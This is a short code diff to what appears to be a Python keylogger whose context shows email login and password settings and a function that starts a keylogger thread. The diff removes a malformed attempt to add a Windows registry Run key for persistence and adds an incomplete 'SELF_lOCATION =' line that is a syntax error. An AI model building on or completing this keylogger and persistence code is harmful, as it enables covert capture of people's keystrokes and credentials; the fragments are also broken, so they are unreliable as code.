@@ -129,6 +129,7 @@ class Constants:
     EMAIL_SUBJECT_HEADER = ""
     EMAIL_LOGIN = ""
     EMAIL_PASSWORD = ""
+    SELF_lOCATION =
 
 
 class OSmanipulation(object):
@@ -297,10 +298,6 @@ def kickOff():
     start_keylogger_thread.start()
     stop_timer.start()
 
-import winreg
-key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                     'Software\Microsoft\Windows\CurrentVersion\Run',
-                     winreg.KEY_SET_VALUE)
-winreg.SetValueEx(key, winreg.REG_BINARY,)
+
 # kickOff()
 
